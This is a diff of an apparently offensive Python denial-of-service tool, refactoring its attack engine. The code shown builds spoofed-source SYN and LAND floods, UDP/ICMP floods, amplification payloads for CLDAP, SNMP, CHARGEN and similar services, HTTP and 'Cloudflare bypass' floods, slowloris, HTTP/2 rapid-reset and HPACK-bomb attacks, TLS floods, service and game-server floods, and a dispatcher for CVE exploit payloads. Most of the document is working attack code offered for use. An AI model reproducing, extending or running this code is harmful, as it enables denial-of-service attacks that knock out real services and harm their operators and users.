     ("TELNET_FLOOD", "📞"), ("SSH_FLOOD", "🔑"), ("SIP_FLOOD", "📞"),
     ("RTSP_FLOOD", "🎥"), ("NFS_FLOOD", "🗺️"), ("KERBEROS_FLOOD", "🎫"),
     ("ARD_FLOOD", "🍎"),
-    # Games
     ("MINECRAFT", "⛏️"), ("MINECRAFT_BOT", "🤖"), ("FIVEM", "🚗"),
     ("FIVEM_TOKEN", "🎫"), ("TEAMSPEAK", "🎧"), ("STEAM_QUERY", "🎮"),
     ("SAMP_QUERY", "🔫"), ("QUAKE_QUERY", "🎯"),
     ("BITTORRENT_DHT", "🌊"), ("KAD_ATTACK", "🌐"), ("MCPE", "📱"),
-    # CVE
     ("CVE_2021_41773", "🐛"), ("CVE_2024_4577", "🐛"),
     ("CVE_2024_23897", "🐛"), ("CVE_2025_24813", "🐛"),
     ("CVE_2025_29927", "🐛"), ("CVE_2022_0073", "🐛"),
@@ -1690,7 +1570,6 @@ ASYNC_METHODS = {
 # ═══════════════════════════════════════════════════════════════════════════════
 #  ENGINE
 # ═══════════════════════════════════════════════════════════════════════════════
-
 class Engine:
     def __init__(self):
         self.running = False
@@ -1880,10 +1759,7 @@ class Engine:
                          f"cpu={rg['cpu']:.1f}% ram={rg['ram']:.1f}%")
             self._monitor_stop.wait(10)
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  RAW FLOOD BASE
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── RAW FLOOD ───────────
     def _raw_flood(self, name: str, pool: RawSocketPool,
                    builder: Callable[[], Optional[bytes]]):
         s = pool.get()
@@ -1927,10 +1803,7 @@ class Engine:
             with suppress(Exception):
                 s.close()
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  L4 TCP
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── L4 TCP ───────────
     def _syn_flood(self):
         self._raw_flood("SYN_FLOOD", raw_tcp, lambda: tcp_packet(
             rand_ip(), self.target_ip, rand_port(), self.target_port,
@@ -1976,31 +1849,15 @@ class Engine:
             rand_ip(), self.target_ip, rand_port(), self.target_port,
             secrets.randbits(32), 0, 0x12))
 
-    def _ipspoof_syn(self):
-        self._syn_flood()
-
-    def _tcp_sack(self):
-        self._syn_flood()
-
-    def _tcp_fastopen(self):
-        self._syn_flood()
+    def _ipspoof_syn(self): self._syn_flood()
+    def _tcp_amp(self): self._syn_flood()
 
     def _land_attack(self):
         self._raw_flood("LAND_ATTACK", raw_tcp, lambda: tcp_packet(
             self.target_ip, self.target_ip, self.target_port,
             self.target_port, secrets.randbits(32), 0, 0x02))
 
-    def _tcp_amp(self):
-        self._syn_flood()
-
-    def _sctp_init(self):
-        self._raw_flood("SCTP_INIT", raw_ip, lambda: (
-            ip_header(rand_ip(), self.target_ip, 132, 32) +
-            struct.pack("!HHII", rand_port(), self.target_port,
-                        secrets.randbits(32), 0) + secrets.token_bytes(16)))
-
     def _tcp_ts_spoof(self):
-        # FIX: real TCP timestamp option spoofing
         ts_val = secrets.randbits(32)
         ts_ecr = secrets.randbits(32)
 
@@ -2032,10 +1889,7 @@ class Engine:
 
         self._raw_flood("TCP_TS_SPOOF", raw_tcp, b)
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  L4 UDP / ICMP
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── L4 UDP/ICMP ───────────
     def _udp_flood(self):
         if raw_udp.get() is not None:
             self._raw_flood("UDP_FLOOD", raw_udp, lambda: udp_packet(
@@ -2049,16 +1903,13 @@ class Engine:
             rand_ip(), self.target_ip,
             secrets.token_bytes(random.randint(1024, 1470))))
 
-    def _icmp_frag(self):
-        self._icmp_flood()
+    def _icmp_frag(self): self._icmp_flood()
+    def _frag_flood(self): self._ipip_flood()
 
     def _jumbo_frame(self):
         self._raw_flood("JUMBO_FRAME", raw_udp, lambda: udp_packet(
             rand_ip(), self.target_ip, rand_port(), self.target_port,
             secrets.token_bytes(random.choice([9000, 12000, 15000]))))
-
-    def _frag_flood(self):
-        self._ipip_flood()
 
     def _gre_flood(self):
         def b():
@@ -2180,10 +2031,7 @@ class Engine:
             with suppress(Exception):
                 s.close()
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  AMP FLOODS
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── AMP ───────────
     def _amp(self, name: str, port: int, builder: Callable[[], bytes]):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -2252,8 +2100,7 @@ class Engine:
              b"\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass\x30\x00")
         self._amp("CLDAP", 389, lambda: p)
 
-    def _ldap(self):
-        self._cldap()
+    def _ldap(self): self._cldap()
 
     def _snmp(self):
         p = (b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x00\x00\x00\x01"
@@ -2281,14 +2128,9 @@ class Engine:
              socket.inet_aton("0.0.0.0") + b"\x00" * 12)
         self._amp("RIPV1", 520, lambda: p)
 
-    def _qotd(self):
-        self._amp("QOTD", 17, lambda: b"quote\r\n")
-
-    def _chargen(self):
-        self._amp("CHARGEN", 19, lambda: b"\x00")
-
-    def _coap(self):
-        self._amp("COAP", 5683, lambda: b"\x40\x01\x00\x01")
+    def _qotd(self): self._amp("QOTD", 17, lambda: b"quote\r\n")
+    def _chargen(self): self._amp("CHARGEN", 19, lambda: b"\x00")
+    def _coap(self): self._amp("COAP", 5683, lambda: b"\x40\x01\x00\x01")
 
     def _tftp(self):
         self._amp("TFTP", 69,
@@ -2367,10 +2209,7 @@ class Engine:
     def _zigbee(self):
         self._amp("ZIGBEE", 17754, lambda: b"\x41" + secrets.token_bytes(30))
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  HTTP/1.1
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── HTTP/1.1 ───────────
     def _http_raw(self, name: str, builder: Callable[[], bytes]):
         while not self._stop:
             if resource_gate.is_paused():
@@ -2487,22 +2326,16 @@ class Engine:
                     f"Connection: close\r\n\r\n").encode()
         self._http_raw("BYPASS", b)
 
-    def _cf_bypass(self):
-        self._bypass()
-
-    def _cfb(self):
-        self._cf_bypass()
-
-    def _cfbuam(self):
-        self._cf_bypass()
+    def _cf_bypass(self): self._bypass()
+    def _cfb(self): self._cf_bypass()
+    def _cfbuam(self): self._cf_bypass()
 
     def _gsb(self):
         self._http_raw("GSB", lambda: (
             f"GET /?qs={secrets.token_hex(6)} HTTP/1.1\r\n"
             f"Host: {self.target_host}\r\n\r\n").encode())
 
-    def _pps(self):
-        self._http_get()
+    def _pps(self): self._http_get()
 
     def _stress(self):
         def b():
@@ -2580,8 +2413,7 @@ class Engine:
                     f"Range: bytes={r}\r\nConnection: close\r\n\r\n").encode()
         self._http_raw("RANGE_BOMB", b)
 
-    def _range_amp(self):
-        self._range_bomb()
+    def _range_amp(self): self._range_bomb()
 
     def _json_bomb(self):
         body = b'{"a":' * 10000 + b'1' + b'}' * 10000
@@ -2687,10 +2519,7 @@ class Engine:
                     f"Connection: close\r\n\r\n").encode() + body
         self._http_raw("OPERATOR_FATIGUE", b)
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  SLOW (async)
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── SLOW (async) ───────────
     async def _slowloris(self, sem: asyncio.Semaphore):
         while not self._stop:
             async with sem:
@@ -2843,10 +2672,7 @@ class Engine:
                 except Exception:
                     self._record("WEBSOCKET_ZIP", ok=False)
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  HTTP/2
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── HTTP/2 ───────────
     def _h2_rapid_reset(self):
         if not HAS_H2:
             return self._http_flood()
@@ -3158,16 +2984,10 @@ class Engine:
             except Exception:
                 self._record("HTTP2_GRPC_CHURN", ok=False)
 
-    def _h2_priority(self):
-        self._h2_multiplex()
+    def _h2_priority(self): self._h2_multiplex()
+    def _h2_continuation(self): self._h2_hpack_bomb()
 
-    def _h2_continuation(self):
-        self._h2_hpack_bomb()
-
-    # ═════════════════════════════════════════════════════════════════════
-    #  HTTP/3 (raw UDP)
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── HTTP/3 ───────────
     def _h3_flood(self, name: str, builder: Callable[[bytes, bytes], bytes]):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -3240,10 +3060,7 @@ class Engine:
             b"\xc3\x00\x00\x00\x01" + bytes([len(d)]) + d +
             bytes([len(s)]) + s + secrets.token_bytes(1400)))
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  TLS
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── TLS ───────────
     def _tls_hello(self, name: str, ech: bool = False):
         while not self._stop:
             if not self._rate_ok():
@@ -3320,8 +3137,7 @@ class Engine:
             try:
                 sni = random.choice(fakes)
                 ch = self._build_client_hello_for(sni)
-                ip = S_IP(src=rand_ip(), dst=self.target_ip,
-                          ttl=random.randint(1, 3))
+                ip = S_IP(src=rand_ip(), dst=self.target_ip, ttl=random.randint(1, 3))
                 tcp = S_TCP(sport=rand_port(), dport=self.target_port or 443,
                             seq=secrets.randbits(32), flags="PA")
                 s_send(ip / tcp / S_Raw(ch), verbose=False)
@@ -3342,10 +3158,7 @@ class Engine:
         hello = hello[:6] + struct.pack(">I", len(hello) - 9)[1:] + hello[9:]
         return hello
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  SERVICES
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── SERVICES ───────────
     def _tcp_svc(self, name: str, port: int, builder: Callable[[], bytes]):
         while not self._stop:
             if not self._rate_ok():
@@ -3397,8 +3210,7 @@ class Engine:
             lambda: b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00"
                     b"\x01\x00\x08\x00\x03\x00\x00\x00")
 
-    def _vnc(self):
-        self._tcp_svc("VNC_FLOOD", 5900, lambda: b"RFB 003.008\n")
+    def _vnc(self): self._tcp_svc("VNC_FLOOD", 5900, lambda: b"RFB 003.008\n")
 
     def _smb(self):
         self._tcp_svc("SMB_FLOOD", 445,
@@ -3432,15 +3244,13 @@ class Engine:
         self._tcp_svc("RTSP_FLOOD", 554,
             lambda: b"DESCRIBE rtsp://x/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
 
-    def _nfs(self):
-        self._tcp_svc("NFS_FLOOD", 2049, lambda: secrets.token_bytes(200))
+    def _nfs(self): self._tcp_svc("NFS_FLOOD", 2049, lambda: secrets.token_bytes(200))
 
     def _kerberos(self):
         self._tcp_svc("KERBEROS_FLOOD", 88,
             lambda: b"\x00\x00\x00\x0a\x6a\x81\x00\x00\x00\x00")
 
-    def _ard(self):
-        self._tcp_svc("ARD_FLOOD", 3283, lambda: secrets.token_bytes(100))
+    def _ard(self): self._tcp_svc("ARD_FLOOD", 3283, lambda: secrets.token_bytes(100))
 
     def _sip(self):
         p = (f"INVITE sip:{self.target_ip} SIP/2.0\r\n"
@@ -3450,10 +3260,7 @@ class Engine:
              f"CSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n").encode()
         self._amp("SIP_FLOOD", 5060, lambda: p)
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  GAMES
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── GAMES ───────────
     def _minecraft(self):
         self._amp("MINECRAFT", 25565,
             lambda: b"\xfe\xfd\x09\x12\x34\x56\x78\x00\x00\x00\x00" +
@@ -3505,10 +3312,7 @@ class Engine:
                     b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd"
                     b"\x12\x34\x56\x78")
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  CVE
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── CVE ───────────
     def _run_cve(self, cve_id: str):
         payloads = {
             "CVE_2021_41773": ("GET",
@@ -3560,10 +3364,7 @@ class Engine:
                 with suppress(Exception):
                     s.close()
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  DISPATCH
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── DISPATCH ───────────
     def _dispatch(self, method: str):
         try:
             table = {
@@ -3573,9 +3374,7 @@ class Engine:
                 "PSH_FLOOD": self._psh_flood, "URG_FLOOD": self._urg_flood,
                 "SYN_ACK_FLOOD": self._syn_ack_flood,
                 "IPSPOOF_SYN": self._ipspoof_syn, "TCP_TS_SPOOF": self._tcp_ts_spoof,
-                "TCP_SACK_ABUSE": self._tcp_sack, "TCP_FASTOPEN": self._tcp_fastopen,
                 "LAND_ATTACK": self._land_attack, "TCP_AMP": self._tcp_amp,
-                "SCTP_INIT": self._sctp_init,
                 "UDP_FLOOD": self._udp_flood, "ICMP_FLOOD": self._icmp_flood,
                 "ICMP_FRAG": self._icmp_frag, "JUMBO_FRAME": self._jumbo_frame,
                 "FRAG_FLOOD": self._frag_flood, "GRE_FLOOD": self._gre_flood,
@@ -3710,10 +3509,7 @@ class Engine:
         except Exception as e:
             log.debug(f"async {method}: {e}")
 
-    # ═════════════════════════════════════════════════════════════════════
-    #  LAUNCH / STOP
-    # ═════════════════════════════════════════════════════════════════════
-
+    # ─────────── LAUNCH ───────────
     def launch(self, acfg: AttackConfig):
         with self._lifecycle:
             if self.running:
@@ -3838,9 +3634,8 @@ engine = Engine()
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  BANNER + CLI
+#  BANNER + MENU
 # ═══════════════════════════════════════════════════════════════════════════════
-
 def print_banner():
     os.system("cls" if IS_WINDOWS else "clear")
     w = term_w()
@@ -3990,7 +3785,6 @@ def interactive_menu():
 # ═══════════════════════════════════════════════════════════════════════════════
 #  MAIN
 # ═══════════════════════════════════════════════════════════════════════════════
-
 def main():
     ap = argparse.ArgumentParser(description=f"{APP_FULL} v{APP_VERSION}")
     ap.add_argument("--mode", choices=["menu", "cli", "list", "about"], default="menu")
